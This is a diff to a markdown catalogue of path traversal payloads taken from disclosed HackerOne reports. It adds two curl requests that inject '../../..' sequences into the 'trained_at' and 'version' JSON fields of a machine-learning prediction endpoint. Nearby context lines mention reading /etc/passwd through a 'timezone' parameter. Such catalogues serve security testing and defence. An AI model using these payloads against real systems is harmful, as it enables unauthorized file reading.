@@ -1,6 +1,6 @@
 # Path Traversal
 
-184 payloads from disclosed reports.
+186 payloads from disclosed reports.
 
 ## Directory traversal using '..' in URL path and query parameter to read /sessions
 
@@ -866,6 +866,27 @@ https://██████████/████/login/downloadForm?filename=
 
 **Parameter:** `filename`
 — [Path traversal leads to reading of local files on ███████ and ████](https://hackerone.com/reports/1888808) · U.S. Dept Of Defense · [rodriguezjorgex](https://hackerone.com/rodriguezjorgex)
+
+
+## Directory traversal via '../../..' in the JSON field "trained_at"
+
+### `82f8fd8f`
+
+```
+curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1", "trained_at": "2023-01-01T00:00:00Z/../../..", "input": [{"title": "test xss", "num_of_top_predictions": 3}]}'
+```
+
+**Parameter:** `trained_at`
+— [Internal machine learning API endpoint for CWE classification is vulnerable to path traversal](https://hackerone.com/reports/2032778) · HackerOne · [jobert](https://hackerone.com/jobert)
+
+### `6873d130`
+
+```
+curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1/../../../..", "trained_at": "2023-01-01T00:00:00Z", "input": [{"title": "test xss", "num_of_top_predictions": 3}]}'
+```
+
+**Parameter:** `version`
+— [Internal machine learning API endpoint for CWE classification is vulnerable to path traversal](https://hackerone.com/reports/2032778) · HackerOne · [jobert](https://hackerone.com/jobert)
 
 
 ## Directory traversal via the 'timezone' parameter to read /etc/passwd
